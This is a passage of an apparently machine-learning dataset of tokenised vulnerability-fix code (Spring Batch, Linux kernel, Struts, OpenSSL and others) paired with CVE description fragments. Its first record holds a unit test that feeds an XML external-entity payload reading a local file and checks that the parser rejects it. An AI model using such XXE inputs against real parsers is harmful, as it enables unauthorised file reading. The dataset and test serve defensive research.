"\\", "n", "<", "!", "ENTITY", "entityex", "SYSTEM", "\\", "\"", "file", ":", "//", "\"", "new", "File", "(", "\"", "src", "/", "test", "/", "resources", "/", "org", "/", "springframework", "/", "batch", "/", "support", "/", "existing", ".", "txt", "\"", ").", "getAbsolutePath", "(", ")", "\"", "\\\"", ">\\", "n", "]", ">\\", "n", "<", "abc", ">", "&", "entityex", ";", "</", "abc", ">", "\";", "StaxEventItemReader", "<", "String", ">", "reader", "=", "new", "StaxEventItemReader", "<", ">(", ");", "reader", ".", "setName", "(", "\"", "foo", "\"", ");", "reader", ".", "setResource", "(", "new", "ByteArrayResource", "(", "xmlWithDtd", ".", "getBytes", "(", "))", ");", "reader", ".", "setUnmarshaller", "(", "new", "MockFragmentUnmarshaller", "(", ")", "{", "@", "Override", "public", "Object", "unmarshal", "(", "Source", "source", ")", "throws", "XmlMappingException", "{", "try", "{", "XMLEventReader", "xmlEventReader", "=", "StaxTestUtils", ".", "getXmlEventReader", "(", "source", ")", ";", "xmlEventReader", ".", "nextEvent", "(", ");", "xmlEventReader", ".", "nextEvent", "(", ");", "return", "xmlEventReader", ".", "getElementText", "(", ");", "}", "catch", "(", "Exception", "e", ")", "{", "throw", "new", "RuntimeException", "(", "e", ")", ";", "}", "}", "}", ");", "reader", ".", "setFragmentRootElementName", "(", "\"", "abc", "\"", ");", "reader", ".", "open", "(", "new", "ExecutionContext", "(", "))", ";", "try", "{", "reader", ".", "read", "(", ");", "fail", "(", "\"", "Should", "fail", "when", "XML", "contains", "DTD", "\"", ");", "}", "catch", "(", "Exception", "e", ")", "{", "Assert", ".", "assertThat", "(", "e", ".", "getMessage", "(", "),", "Matchers", ".", "containsString", "(", "\"", "Undeclared", "general", "entity", "\\", "\"", "entityex", "\\", "\"\"", "))", ";", "}", "}", "*", "Copyright", "2017", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "javax", ".", "xml", ".", "stream", ".", "XMLInputFactory", ";", "*", "@", "author", "Mahmoud", "Ben", "Hassine", ".", "xmlInputFactory", "(", "XMLInputFactory", ".", "newInstance", "(", "))", "*", "Copyright", "2008", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "org", ".", "springframework", ".", "batch", ".", "item", ".", "xml", ".", "StaxUtils", ";", "*", "@", "author", "Mahmoud", "Ben", "Hassine", "eventReader", "=", "StaxUtils", ".", "createXmlInputFactory", "(", ").", "createXMLEventReader", "(</s>*", "Copyright", "2010", "-", "2014", "the", "original", "author", "or", "authors", ".", "Transformer", "transformer", "=", "TransformerFactory", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "*", "Copyright", "2006", "-", "2007", "the", "original", "author", "or", "authors", ".", "eventReader", "=", "XMLInputFactory", ".", "newInstance", "(", ").", "createXMLEventReader", "(", "inputStream", ")", ";", "*", "Copyright", "2006", "-", "2007", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2017", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2008", "-", "2014", "the", "original", "author", "or", "authors", ".", "import", "javax", ".", "xml", ".", "stream", ".", "XMLInputFactory", ";", "XMLEventReader", "reader", "=", "XMLInputFactory", ".", "newInstance", "(", ").", "createXMLEventReader", "(", "resource", ".", "getInputStream", "(", "))", ";", "XMLEventReader", "reader", "=", "XMLInputFactory", ".", "newInstance", "(", ").", "createXMLEventReader", "(", "resource", ".", "getInputStream", "(", "))", ";", "XMLEventReader", "reader", "=", "XMLInputFactory", ".", "newInstance", "(", ").", "createXMLEventReader", "(", "resource", ".", "getInputStream", "(", "))", ";", "*", "Copyright", "2017", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2008", "-", "2012", "the", "original", "author", "or", "authors", ".", "import", "javax", ".", "xml", ".", "stream", ".", "XMLInputFactory", ";", "eventReader", "=", "XMLInputFactory", ".", "newInstance", "(", ").", "createXMLEventReader", "("], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially-crafted", "file"]}
{"contents": ["empty"], "code_tokens": ["sb", "-", ">", "s_readonly_remount", "=", "1", ";", "smp_wmb", "(", ");</s>DEFINE_STATIC_LGLOCK", "(", "files_lglock", ")", ";", "INIT_LIST_HEAD", "(", "&", "f", "-", ">", "f_u", ".", "fu_list", ")", ";", "file_sb_list_del", "(", "file", ")", ";", "file_sb_list_del", "(", "file", ")", ";", "file_sb_list_del", "(", "file", ")", ";", "static", "inline", "int", "file_list_cpu", "(", "struct", "file", "*", "file", ")", "{", "#", "ifdef", "CONFIG_SMP", "return", "file", "-", ">", "f_sb_list_cpu", ";", "#", "else", "return", "smp_processor_id", "(", ");", "#", "endif", "}", "/", "*", "helper", "for", "file_sb_list_add", "to", "reduce", "ifdefs", "*", "/", "static", "inline", "void", "__file_sb_list_add", "(", "struct", "file", "*", "file", ",", "struct", "super_block", "*", "sb", ")", "{", "struct", "list_head", "*", "list", ";", "#", "ifdef", "CONFIG_SMP", "int", "cpu", ";", "cpu", "=", "smp_processor_id", "(", ");", "file", "-", ">", "f_sb_list_cpu", "=", "cpu", ";", "list", "=", "per_cpu_ptr", "(", "sb", "-", ">", "s_files", ",", "cpu", ")", ";", "#", "else", "list", "=", "&", "sb", "-", ">", "s_files", ";", "#", "endif", "list_add", "(", "&", "file", "-", ">", "f_u", ".", "fu_list", ",", "list", ")", ";", "}", "/", "**", "*", "file_sb_list_add", "-", "add", "a", "file", "to", "the", "sb", "'", "s", "file", "list", "*", "@", "file", ":", "file", "to", "add", "*", "@", "sb", ":", "sb", "to", "add", "it", "to", "*", "*", "Use", "this", "function", "to", "associate", "a", "file", "with", "the", "superblock", "of", "the", "inode", "it", "*", "refers", "to", ".", "*", "/", "void", "file_sb_list_add", "(", "struct", "file", "*", "file", ",", "struct", "super_block", "*", "sb", ")", "{", "if", "(", "likely", "(", "!(", "file", "-", ">", "f_mode", "&", "FMODE_WRITE", ")", "))", "return", ";", "if", "(", "!", "S_ISREG", "(", "file_inode", "(", "file", ")", "->", "i_mode", ")", ")", "return", ";", "lg_local_lock", "(", "&", "files_lglock", ")", ";", "__file_sb_list_add", "(", "file", ",", "sb", ")", ";", "lg_local_unlock", "(", "&", "files_lglock", ")", ";", "}", "/", "**", "*", "file_sb_list_del", "-", "remove", "a", "file", "from", "the", "sb", "'", "s", "file", "list", "*", "@", "file", ":", "file", "to", "remove", "*", "@", "sb", ":", "sb", "to", "remove", "it", "from", "*", "*", "Use", "this", "function", "to", "remove", "a", "file", "from", "its", "superblock", ".", "*", "/", "void", "file_sb_list_del", "(", "struct", "file", "*", "file", ")", "{", "if", "(", "!", "list_empty", "(", "&", "file", "-", ">", "f_u", ".", "fu_list", ")", ")", "{", "lg_local_lock_cpu", "(", "&", "files_lglock", ",", "file_list_cpu", "(", "file", ")", ");", "list_del_init", "(", "&", "file", "-", ">", "f_u", ".", "fu_list", ")", ";", "lg_local_unlock_cpu", "(", "&", "files_lglock", ",", "file_list_cpu", "(", "file", ")", ");", "}", "}", "#", "ifdef", "CONFIG_SMP", "/", "*", "*", "These", "macros", "iterate", "all", "files", "on", "all", "CPUs", "for", "a", "given", "superblock", ".", "*", "files_lglock", "must", "be", "held", "globally", ".", "*", "/", "#", "define", "do_file_list_for_each_entry", "(", "__sb", ",", "__file", ")", "\\", "{", "\\", "int", "i", ";", "\\", "for_each_possible_cpu", "(", "i", ")", "{", "\\", "struct", "list_head", "*", "list", ";", "\\", "list", "=", "per_cpu_ptr", "(", "(", "__sb", ")", "->", "s_files", ",", "i", ")", ";", "\\", "list_for_each_entry", "(", "(", "__file", ")", ",", "list", ",", "f_u", ".", "fu_list", ")", "#", "define", "while_file_list_for_each_entry", "\\", "}", "\\", "}", "#", "else", "#", "define", "do_file_list_for_each_entry", "(", "__sb", ",", "__file", ")", "\\", "{", "\\", "struct", "list_head", "*", "list", ";", "\\", "list", "=", "&", "(", "sb", ")", "->", "s_files", ";", "\\", "list_for_each_entry", "(", "(", "__file", ")", ",", "list", ",", "f_u", ".", "fu_list", ")", "#", "define", "while_file_list_for_each_entry", "\\", "}", "#", "endif", "/", "**", "*", "mark_files_ro", "-", "mark", "all", "files", "read", "-", "only", "*", "@", "sb", ":", "superblock", "in", "question", "*", "*", "All", "files", "are", "marked", "read", "-", "only", ".", "We", "don", "'", "t", "care", "about", "pending", "*", "delete", "files", "so", "this", "should", "be", "used", "in", "'", "force", "'", "mode", "only", ".", "*", "/", "void", "mark_files_ro", "(", "struct", "super_block", "*", "sb", ")", "{", "struct", "file", "*", "f", ";", "lg_global_lock", "(", "&", "files_lglock", ")", ";", "do_file_list_for_each_entry", "(", "sb", ",", "f", ")", "{", "if", "(", "!", "file_count", "(", "f", ")", ")", "continue", ";", "if", "(", "!(", "f", "-", ">", "f_mode", "&", "FMODE_WRITE", ")", ")", "continue", ";", "spin_lock", "(", "&", "f", "-", ">", "f_lock", ")", ";", "f", "-", ">", "f_mode", "&", "=", "~", "FMODE_WRITE", ";", "spin_unlock", "(", "&", "f", "-", ">", "f_lock", ")", ";", "if", "(", "file_check_writeable", "(", "f", ")", "!", "=", "0", ")", "continue", ";", "__mnt_drop_write", "(", "f", "-", ">", "f_path", ".", "mnt", ")", ";", "file_release_write", "(", "f", ")", ";", "}", "while_file_list_for_each_entry", ";", "lg_global_unlock", "(", "&", "files_lglock", ")", ";", "}", "lg_lock_init", "(", "&", "files_lglock", ",", "\"", "files_lglock", "\"", ");", "extern", "void", "file_sb_list_add", "(", "struct", "file", "*", "f", ",", "struct", "super_block", "*", "sb", ")", ";", "extern", "void", "file_sb_list_del", "(", "struct", "file", "*", "f", ")", ";", "extern", "void", "mark_files_ro", "(", "struct", "super_block", "*", ");", "file_sb_list_add", "(", "f", ",", "inode", "-", ">", "i_sb", ")", ";", "file_sb_list_del", "(", "f", ")", ";", "#", "ifdef", "CONFIG_SMP", "free_percpu", "(", "s", "-", ">", "s_files", ")", ";", "#", "endif", "#", "ifdef", "CONFIG_SMP", "s", "-", ">", "s_files", "=", "alloc_percpu", "(", "struct", "list_head", ")", ";", "if", "(", "!", "s", "-", ">", "s_files", ")", "goto", "fail", ";", "for_each_possible_cpu", "(", "i", ")", "INIT_LIST_HEAD", "(", "per_cpu_ptr", "(", "s", "-", ">", "s_files", ",", "i", ")", ");", "#", "else", "INIT_LIST_HEAD", "(", "&", "s", "-", ">", "s_files", ")", ";", "#", "endif", "mark_files_ro", "(", "sb", ")", ";", "/", "*", "*", "fu_list", "becomes", "invalid", "after", "file_free", "is", "called", "and", "queued", "via", "*", "fu_rcuhead", "for", "RCU", "freeing", "*", "/", "struct", "list_head", "fu_list", ";", "#", "ifdef", "CONFIG_SMP", "int", "f_sb_list_cpu", ";", "#", "endif", "#", "ifdef", "CONFIG_SMP", "struct", "list_head", "__percpu", "*", "s_files", ";", "#", "else", "struct", "list_head", "s_files", ";", "#", "endif"], "docstring_tokens": ["via", "unspecified", "use", "of", "Asynchronous", "I/O", "(AIO", ")", "operations", "."]}
{"contents": ["empty"], "code_tokens": ["*", "$", "Id", "$", "*", "*", "*", "import", "java", ".", "util", ".", "*;", "/", "/", "resources", "as", "they", "may", "not", "have", "been", "able", "to", "have", "been", "+", "\"", "unexpected", "exception", "or", "error", "thrown", ",", "so", "marking", "the", "\"", "+", "\"", "servlet", "as", "unavailable", ".", "Most", "likely", ",", "this", "is", "due", "to", "an", "\"", "+", "\"", "incorrect", "or", "missing", "library", "dependency", ".", "\",", "t", ")", ";", "}", "HashSet", "suppressProperties", "=", "new", "HashSet", "(", ");", "suppressProperties", ".", "add", "(", "\"", "class", "\"", ");", "suppressProperties", ".", "add", "(", "\"", "multipartRequestHandler", "\"", ");", "suppressProperties", ".", "add", "(", "\"", "resultValueMap", "\"", ");", "new", "SuppressPropertiesBeanIntrospector", "(", "suppressProperties", ")", ");</s>*", "$", "Id", "$", "*", "*", "*", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Enumeration", ";", "import", "java", ".", "util", ".", "Iterator", ";", "import", "java", ".", "util", ".", "MissingResourceException", ";", "/", "/", "resources", "as", "they", "may", "not", "have", "been", "able", "to", "have", "been", "}", "SuppressPropertiesBeanIntrospector", ".", "SUPPRESS_CLASS", ")", ";"], "docstring_tokens": ["via", "crafted", "input"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "azx_dev", "-", ">", "period_bytes", "=", "=", "0", ")", "{", "printk", "(", "KERN_WARNING", "\"", "hda", "-", "intel", ":", "Divide", "by", "zero", "was", "avoided", "\"", "\"", "in", "azx_dev", "-", ">", "period_bytes", ".", "\\", "n", "\"", ");", "return", "0", ";", "}</s>"], "docstring_tokens": ["via", "unknown", "manipulations", "that", "trigger", "a", "divide-by-zero", "error", "."]}
{"contents": ["empty"], "code_tokens": ["#", "define", "IS_IA32", "is_compat_task", "(", ")</s>#", "define", "IS_IA32", "test_thread_flag", "(", "TIF_IA32", ")"], "docstring_tokens": ["switching", "a", "32-bit", "process", "to", "64-bit", "mode"]}
{"contents": ["empty"], "code_tokens": ["*", ")", "Fix", "for", "double", "free", "bug", "in", "ssl", "/", "s3_clnt", ".", "c", "CVE", "-", "2010", "-", "2939", "[", "Steve", "Henson", "]", "bn_ctx", "=", "NULL", ";</s>"], "docstring_tokens": ["persuading", "a", "victim", "to", "connect", "to", "the", "malicious", "server"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "eof", ">", "v", ")", "{", "rv", "=", "-", "1", ";", "goto", "end", ";", "}</s>"], "docstring_tokens": ["via", "crafted", "base64", "data", "that", "triggers", "a", "buffer", "overflow", "."]}
{"contents": ["empty"], "code_tokens": ["import", "org", ".", "dpppt", ".", "backend", ".", "sdk", ".", "ws", ".", "radarcovid", ".", "annotation", ".", "ResponseRetention", ";", "@", "ResponseRetention", "(", "time", "=", "\"", "application", ".", "response", ".", "retention", ".", "time", ".", "exposed", "\"", ")", "/", "*", "*", "Copyright", "(", "c", ")", "2020", "Gobierno", "de", "Espa", "\u00f1", "a", "*", "*", "This", "Source", "Code", "Form", "is", "subject", "to", "the", "terms", "of", "the", "Mozilla", "Public", "*", "License", ",", "v", ".", "2", ".", "0", ".", "If", "a", "copy", "of", "the", "MPL", "was", "not", "distributed", "with", "this", "*", "file", ",", "You", "can", "obtain", "one", "at", "http", ":", "//", "mozilla", ".", "org", "/", "MPL", "/", "2", ".", "0", "/", ".", "*", "*", "SPDX", "-", "License", "-", "Identifier", ":", "MPL", "-", "2", ".", "0", "*", "/", "package", "org", ".", "dpppt", ".", "backend", ".", "sdk", ".", "ws", ".", "radarcovid", ".", "annotation", ";", "import", "java", ".", "lang", ".", "annotation", ".", "Documented", ";", "import", "java", ".", "lang", ".", "annotation", ".", "ElementType", ";", "import", "java", ".", "lang", ".", "annotation", ".", "Retention", ";", "import", "java", ".", "lang", ".", "annotation", ".", "RetentionPolicy", ";", "import", "java", ".", "lang", ".", "annotation", ".", "Target", ";", "@", "Documented", "@", "Retention", "(", "value", "=", "RetentionPolicy", ".", "RUNTIME", ")", "@", "Target", "(", "value", "=", "{", "ElementType", ".", "CONSTRUCTOR", ",", "ElementType", ".", "METHOD", "}", ")", "public", "@", "interface", "ResponseRetention", "{", "/", "**", "*", "Environment", "property", "with", "response", "retention", "time", ",", "in", "milliseconds", "*", "/", "String", "time", "(", ");", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "89", "@", "@", "/", "*", "*", "Copyright", "(", "c", ")", "2020", "Gobierno", "de", "Espa", "\u00f1", "a", "*", "*", "This", "Source", "Code", "Form", "is", "subject", "to", "the", "terms", "of", "the", "Mozilla", "Public", "*", "License", ",", "v", ".", "2", ".", "0", ".", "If", "a", "copy", "of", "the", "MPL", "was", "not", "distributed", "with", "this", "*", "file", ",", "You", "can", "obtain", "one", "at", "http", ":", "//", "mozilla", ".", "org", "/", "MPL", "/", "2", ".", "0", "/", ".", "*", "*", "SPDX", "-", "License", "-", "Identifier", ":", "MPL", "-", "2", ".", "0", "*", "/", "package", "org", ".", "dpppt", ".", "backend", ".", "sdk", ".", "ws", ".", "radarcovid", ".", "config", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "org", ".", "apache", ".", "commons", ".", "lang3", ".", "math", ".", "NumberUtils", ";", "import", "org", ".", "aspectj", ".", "lang", ".", "ProceedingJoinPoint", ";", "import", "org", ".", "aspectj", ".", "lang", ".", "annotation", ".", "Around", ";", "import", "org", ".", "aspectj", ".", "lang", ".", "annotation", ".", "Aspect", ";", "import", "org", ".", "aspectj", ".", "lang", ".", "annotation", ".", "Pointcut", ";", "import", "org", ".", "dpppt", ".", "backend", ".", "sdk", ".", "ws", ".", "radarcovid", ".", "annotation", ".", "ResponseRetention", ";", "import", "org", ".", "dpppt", ".", "backend", ".", "sdk", ".", "ws", ".", "radarcovid", ".", "exception", ".", "RadarCovidServerException", ";", "import", "org", ".", "slf4j", ".", "Logger", ";", "import", "org", ".", "slf4j", ".", "LoggerFactory", ";", "import", "org", ".", "springframework", ".", "beans", ".", "factory", ".", "annotation", ".", "Autowired", ";", "import", "org", ".", "springframework", ".", "boot", ".", "autoconfigure", ".", "condition", ".", "ConditionalOnProperty", ";", "import", "org", ".", "springframework", ".", "context", ".", "annotation", ".", "Configuration", ";", "import", "org", ".", "springframework", ".", "core", ".", "env", ".", "Environment", ";", "import", "org", ".", "springframework", ".", "http", ".", "HttpStatus", ";", "import", "org", ".", "springframework", ".", "stereotype", ".", "Component", ";", "/", "**", "*", "Aspect", "in", "charge", "of", "controlling", "the", "minimum", "response", "time", "of", "a", "service", ".", "*", "/", "@", "Configuration", "@", "ConditionalOnProperty", "(", "name", "=", "\"", "application", ".", "response", ".", "retention", ".", "enabled", "\"", ",", "havingValue", "=", "\"", "true", "\"", ",", "matchIfMissing", "=", "true", ")", "public", "class", "ResponseRetentionAspectConfiguration", "{", "private", "static", "final", "Logger", "log", "=", "LoggerFactory", ".", "getLogger", "(", "\"", "org", ".", "dpppt", ".", "backend", ".", "sdk", ".", "ws", ".", "radarcovid", ".", "annotation", ".", "ResponseRetention", "\"", ");", "@", "Autowired", "private", "Environment", "environment", ";", "@", "Aspect", "@", "Component", "public", "class", "ControllerTimeResponseControlAspect", "{", "@", "Pointcut", "(", "\"@", "annotation", "(", "responseRetention", ")", "\")", "public", "void", "annotationPointCutDefinition", "(", "ResponseRetention", "responseRetention", ")", "{", "}", "@", "Around", "(", "\"", "execution", "(", "@", "org", ".", "dpppt", ".", "backend", ".", "sdk", ".", "ws", ".", "radarcovid", ".", "annotation", ".", "ResponseRetention", "*", "*", "..", "controller", ".", ".*", "(.", ".)", ")", "&", "&", "annotationPointCutDefinition", "(", "responseRetention", ")", "\")", "public", "Object", "logAround", "(", "ProceedingJoinPoint", "joinPoint", ",", "ResponseRetention", "responseRetention", ")", "throws", "Throwable", "{", "log", ".", "debug", "(", "\"*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "INIT", "TIME", "RESPONSE", "CONTROL", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "\")", ";", "long", "start", "=", "System", ".", "currentTimeMillis", "(", ");", "try", "{", "String", "className", "=", "joinPoint", ".", "getSignature", "(", ").", "getDeclaringTypeName", "(", ");", "String", "methodName", "=", "joinPoint", ".", "getSignature", "(", ").", "getName", "(", ");", "Object", "result", "=", "joinPoint", ".", "proceed", "(", ");", "long", "elapsedTime", "=", "System", ".", "currentTimeMillis", "(", ")", "-", "start", ";", "long", "responseRetentionTimeMillis", "=", "getTimeMillis", "(", "responseRetention", ".", "time", "(", "))", ";", "log", ".", "debug", "(", "\"", "Controller", ":", "Controller", "{", "}.", "{}", "(", ")", "execution", "time", ":", "{", "}", "ms", "\"", ",", "className", ",", "methodName", ",", "elapsedTime", ")", ";", "if", "(", "elapsedTime", "<", "responseRetentionTimeMillis", ")", "{", "Thread", ".", "sleep", "(", "responseRetentionTimeMillis", "-", "elapsedTime", ")", ";", "}", "elapsedTime", "=", "System", ".", "currentTimeMillis", "(", ")", "-", "start", ";", "log", ".", "debug", "(", "\"", "Controller", ":", "Controller", "{", "}.", "{}", "(", ")", "NEW", "execution", "time", ":", "{", "}", "ms", "\"", ",", "className", ",", "methodName", ",", "elapsedTime", ")", ";", "log", ".", "debug", "(", "\"*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "END", "TIME", "RESPONSE", "CONTROL", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*\"", ");", "return", "result", ";", "}", "catch", "(", "IllegalArgumentException", "e", ")", "{", "log", ".", "error", "(", "\"", "Controller", ":", "Illegal", "argument", "{", "}", "in", "{", "}", "(", ")\"", ",", "Arrays", ".", "toString", "(", "joinPoint", ".", "getArgs", "(", "))", ",", "joinPoint", ".", "getSignature", "(", ").", "getName", "(", "))", ";", "log", ".", "debug", "(", "\"*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "END", "TIME", "RESPONSE", "CONTROL", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*\"", ");", "throw", "e", ";", "}", "}", "private", "long", "getTimeMillis", "(", "String", "timeMillisString", ")", "{", "String", "stringValue", "=", "environment", ".", "getProperty", "(", "timeMillisString", ")", ";", "if", "(", "NumberUtils", ".", "isCreatable", "(", "stringValue", ")", ")", "{", "return", "Long", ".", "parseLong", "(", "stringValue", ")", ";", "}", "else", "{", "throw", "new", "RadarCovidServerException", "(", "HttpStatus", ".", "INTERNAL_SERVER_ERROR", ",", "\"", "Invalid", "timeMillisString", "value", "\\", "\"\"", "+", "timeMillisString", "+", "\"", "\\\"", "-", "not", "found", "or", "cannot", "parse", "into", "long", "\"", ");", "}", "}", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "34", "@", "@", "/", "*", "*", "Copyright", "(", "c", ")", "2020", "Gobierno", "de", "Espa", "\u00f1", "a", "*", "*", "This", "Source", "Code", "Form", "is", "subject", "to", "the", "terms", "of", "the", "Mozilla", "Public", "*", "License", ",", "v", ".", "2", ".", "0", ".", "If", "a", "copy", "of", "the", "MPL", "was", "not", "distributed", "with", "this", "*", "file", ",", "You", "can", "obtain", "one", "at", "http", ":", "//", "mozilla", ".", "org", "/", "MPL", "/", "2", ".", "0", "/", ".", "*", "*", "SPDX", "-", "License", "-", "Identifier", ":", "MPL", "-", "2", ".", "0", "*", "/", "package", "org", ".", "dpppt", ".", "backend", ".", "sdk", ".", "ws", ".", "radarcovid", ".", "exception", ";", "import", "org", ".", "springframework", ".", "http", ".", "HttpStatus", ";", "public", "class", "RadarCovidServerException", "extends", "RuntimeException", "{", "private", "final", "HttpStatus", "httpStatus", ";", "/", "**", "*", "The", "Constructor", "for", "the", "Exception", "class", ".", "*", "*", "@", "param", "httpStatus", "the", "state", "of", "the", "server", "*", "@", "param", "message", "the", "message", "*", "/", "public", "RadarCovidServerException", "(", "HttpStatus", "httpStatus", ",", "String", "message", ")", "{", "super", "(", "message", ")", ";", "this", ".", "httpStatus", "=", "httpStatus", ";", "}", "public", "HttpStatus", "getHttpStatus", "(", ")", "{", "return", "httpStatus", ";", "}", "}</s>"], "docstring_tokens": ["using", "man-in-the-middle", "attack", "techniques"]}
{"contents": ["empty"], "code_tokens": ["/", "*", "*", "Here", "if", "the", "dst", "entry", "we", "'", "ve", "looked", "up", "*", "has", "a", "neighbour", "entry", "that", "is", "in", "the", "INCOMPLETE", "*", "state", "and", "the", "src", "address", "from", "the", "flow", "is", "*", "marked", "as", "OPTIMISTIC", ",", "we", "release", "the", "found", "*", "dst", "entry", "and", "replace", "it", "instead", "with", "the", "*", "dst", "entry", "of", "the", "nexthop", "router", "*", "/", "if", "(", "(*", "dst", ")", "->", "neighbour", "&", "&", "!", "((", "*", "dst", ")", "->", "neighbour", "-", ">", "nud_state", "&", "NUD_VALID", ")", ")", "{", "struct", "inet6_ifaddr", "*", "ifp", ";", "struct", "flowi", "fl_gw", ";", "int", "redirect", ";", "ifp", "=", "ipv6_get_ifaddr", "(", "net", ",", "&", "fl", "-", ">", "fl6_src", ",", "(", "*", "dst", ")", "->", "dev", ",", "1", ")", ";", "redirect", "=", "(", "ifp", "&", "&", "ifp", "-", ">", "flags", "&", "IFA_F_OPTIMISTIC", ")", ";", "if", "(", "ifp", ")", "in6_ifa_put", "(", "ifp", ")", ";", "if", "(", "redirect", ")", "{", "/", "*", "*", "We", "need", "to", "get", "the", "dst", "entry", "for", "the", "*", "default", "router", "instead", "*", "/", "dst_release", "(", "*", "dst", ")", ";", "memcpy", "(", "&", "fl_gw", ",", "fl", ",", "sizeof", "(", "struct", "flowi", ")", ");", "memset", "(", "&", "fl_gw", ".", "fl6_dst", ",", "0", ",", "sizeof", "(", "struct", "in6_addr", ")", ");", "*", "dst", "=", "ip6_route_output", "(", "net", ",", "sk", ",", "&", "fl_gw", ")", ";", "if", "(", "(", "err", "=", "(", "*", "dst", ")", "->", "error", ")", ")", "goto", "out_err_release", ";", "}</s>/", "*", "*", "Here", "if", "the", "dst", "entry", "we", "'", "ve", "looked", "up", "*", "has", "a", "neighbour", "entry", "that", "is", "in", "the", "INCOMPLETE", "*", "state", "and", "the", "src", "address", "from", "the", "flow", "is", "*", "marked", "as", "OPTIMISTIC", ",", "we", "release", "the", "found", "*", "dst", "entry", "and", "replace", "it", "instead", "with", "the", "*", "dst", "entry", "of", "the", "nexthop", "router", "*", "/", "if", "(", "!(", "(*", "dst", ")", "->", "neighbour", "-", ">", "nud_state", "&", "NUD_VALID", ")", ")", "{", "struct", "inet6_ifaddr", "*", "ifp", ";", "struct", "flowi", "fl_gw", ";", "int", "redirect", ";", "ifp", "=", "ipv6_get_ifaddr", "(", "net", ",", "&", "fl", "-", ">", "fl6_src", ",", "(", "*", "dst", ")", "->", "dev", ",", "1", ")", ";", "redirect", "=", "(", "ifp", "&", "&", "ifp", "-", ">", "flags", "&", "IFA_F_OPTIMISTIC", ")", ";", "if", "(", "ifp", ")", "in6_ifa_put", "(", "ifp", ")", ";", "if", "(", "redirect", ")", "{", "/", "*", "*", "We", "need", "to", "get", "the", "dst", "entry", "for", "the", "*", "default", "router", "instead", "*", "/", "dst_release", "(", "*", "dst", ")", ";", "memcpy", "(", "&", "fl_gw", ",", "fl", ",", "sizeof", "(", "struct", "flowi", ")", ");", "memset", "(", "&", "fl_gw", ".", "fl6_dst", ",", "0", ",", "sizeof", "(", "struct", "in6_addr", ")", ");", "*", "dst", "=", "ip6_route_output", "(", "net", ",", "sk", ",", "&", "fl_gw", ")", ";", "if", "(", "(", "err", "=", "(", "*", "dst", ")", "->", "error", ")", ")", "goto", "out_err_release", ";", "}"], "docstring_tokens": ["via", "unknown", "vectors", "."]}
{"contents": ["empty"], "code_tokens": ["char", "*", "driver_override", ",", "*", "old", ",", "*", "cp", ";", "device_lock", "(", "dev", ")", ";", "old", "=", "pdev", "-", ">", "driver_override", ";", "device_unlock", "(", "dev", ")", ";", "ssize_t", "len", ";", "device_lock", "(", "dev", ")", ";", "len", "=", "sprintf", "(", "buf", ",", "\"", "%", "s", "\\", "n", "\"", ",", "pdev", "-", ">", "driver_override", ")", ";", "device_unlock", "(", "dev", ")", ";", "return", "len", ";</s>char", "*", "driver_override", ",", "*", "old", "=", "pdev", "-", ">", "driver_override", ",", "*", "cp", ";", "return", "sprintf", "(", "buf", ",", "\"", "%", "s", "\\", "n", "\"", ",", "pdev", "-", ">", "driver_override", ")", ";"], "docstring_tokens": ["by", "leveraging", "a", "race", "condition", "between", "a", "read", "operation", "and", "a", "store", "operation", "that", "involve", "different", "overrides", "."]}
{"contents": ["empty"], "code_tokens": ["*", "be", "skipped", "over", ".", "It", "is", "not", "permitted", "for", "userspace", "to", "create", "or", "join", "*", "keyrings", "whose", "name", "begin", "with", "a", "dot", ".", "ret", "=", "-", "EPERM", ";", "if", "(", "name", "[", "0", "]", "=", "=", "'", ".'", ")", "goto", "error_name", ";", "error_name", ":</s>*", "be", "skipped", "over", "."], "docstring_tokens": ["adding", "a", "new", "public", "key", "of", "its", "own", "devising", "to", "the", "keyring"]}
{"contents": ["empty"], "code_tokens": ["return", "-", "ENOMEM", ";</s>"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["int", "i", ",", "length", ";", "/", "*", "Sanity", "check", "OID", "encoding", ".", "*", "Need", "at", "least", "one", "content", "octet", ".", "*", "MSB", "must", "be", "clear", "in", "the", "last", "octet", ".", "*", "can", "'", "t", "have", "leading", "0x80", "in", "subidentifiers", ",", "see", ":", "X", ".", "690", "8", ".", "19", ".", "2", "if", "(", "len", "<", "=", "0", "|", "|", "len", ">", "INT_MAX", "|", "|", "pp", "=", "=", "NULL", "|", "|", "(", "p", "=", "*", "pp", ")", "=", "=", "NULL", "|", "|", "p", "[", "len", "-", "1", "]", "&", "0x80", ")", "{", "ASN1err", "(", "ASN1_F_C2I_ASN1_OBJECT", ",", "ASN1_R_INVALID_OBJECT_ENCODING", ")", ";", "return", "NULL", ";", "}", "/", "*", "Now", "0", "<", "len", "<", "=", "INT_MAX", ",", "so", "the", "cast", "is", "safe", ".", "*", "/", "length", "=", "(", "int", ")", "len", ";", "for", "(", "i", "=", "0", ";", "i", "<", "length", ";", "i", "+", "+,", "p", "+", "+)", "if", "(", "(", "data", "=", "=", "NULL", ")", "|", "|", "(", "ret", "-", ">", "length", "<", "length", ")", ")", "data", "=", "(", "unsigned", "char", "*", ")", "OPENSSL_malloc", "(", "length", ")", ";", "memcpy", "(", "data", ",", "p", ",", "length", ")", ";", "ret", "-", ">", "length", "=", "length", ";", "p", "+", "=", "length", ";", "/", "*", "Ensure", "that", ",", "at", "every", "state", ",", "|", "buf", "|", "is", 